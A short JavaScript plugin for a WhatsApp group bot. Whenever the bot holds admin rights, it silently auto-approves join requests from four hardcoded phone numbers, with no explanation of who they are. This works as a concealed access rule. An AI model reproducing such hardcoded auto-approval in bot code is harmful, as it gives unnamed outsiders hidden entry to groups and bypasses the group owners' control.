let handler = m => m

handler.before = async function (m, {conn, isBotAdmin}) {
if (!isBotAdmin) return !0

await (await conn.groupRequestParticipantsList(m.chat)).filter(m => m.jid.startsWith('16714828922@s.whatsapp.net')).map(async c => conn.groupRequestParticipantsUpdate(m.chat, [c.jid], "approve"))

await (await conn.groupRequestParticipantsList(m.chat)).filter(m => m.jid.startsWith('5355495621@s.whatsapp.net')).map(async c => conn.groupRequestParticipantsUpdate(m.chat, [c.jid], "approve"))

await (await conn.groupRequestParticipantsList(m.chat)).filter(m => m.jid.startsWith('994403115531@s.whatsapp.net')).map(async c => conn.groupRequestParticipantsUpdate(m.chat, [c.jid], "approve"))
    
    await (await conn.groupRequestParticipantsList(m.chat)).filter(m => m.jid.startsWith('4794098204@s.whatsapp.net')).map(async c => conn.groupRequestParticipantsUpdate(m.chat, [c.jid], "approve"))
}


handler.group = true
export default handler